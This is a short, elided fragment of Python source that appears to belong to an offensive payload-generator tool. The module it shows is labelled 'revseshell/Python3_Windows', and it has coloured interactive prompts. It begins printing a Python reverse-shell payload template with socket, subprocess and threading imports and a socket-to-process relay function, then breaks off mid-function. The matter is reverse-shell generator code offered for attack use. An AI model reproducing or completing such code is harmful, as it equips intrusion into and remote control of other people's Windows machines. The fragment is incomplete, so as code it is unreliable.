...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/Python3_Windows\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/Python3_Windows\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mimport os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
